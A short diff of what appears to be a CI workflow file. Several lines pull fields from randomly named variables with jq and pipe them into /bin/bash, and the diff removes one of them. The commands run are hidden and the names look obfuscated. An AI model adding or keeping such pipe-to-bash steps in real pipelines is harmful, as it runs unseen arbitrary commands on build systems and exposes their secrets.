@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$ejk5314" | jq -r .uho6 | /bin/bash
           echo $rof950 | jq -r .x82 | /bin/bash
           echo $zvyya96307 | jq -r .bjkkp5 | /bin/bash
-          printf '%s' "$om2658" | jq -r .tfva31 | /bin/bash
           echo $z46611 | jq -r .awcmd26301 | /bin/bash
 
       - name: Store results
